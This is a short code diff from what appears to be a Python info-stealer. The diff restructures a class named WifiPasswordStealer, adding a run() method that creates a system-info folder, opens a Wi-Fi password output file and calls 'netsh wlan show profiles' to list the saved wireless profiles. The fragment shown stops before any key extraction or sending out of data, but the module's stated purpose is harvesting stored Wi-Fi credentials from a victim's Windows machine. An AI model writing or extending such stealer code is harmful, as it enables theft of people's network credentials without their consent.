@@ -13,7 +13,8 @@ class WifiPasswordStealer(ModuleManager):
 
         if not os.path.isdir(self.systeminfo_folder):
             os.makedirs(self.systeminfo_folder)
-
+    
+    def run(self) -> None:
         with open(self.wifi_passwords_filename, 'w+') as file:
             data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace").split('\n')
             profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
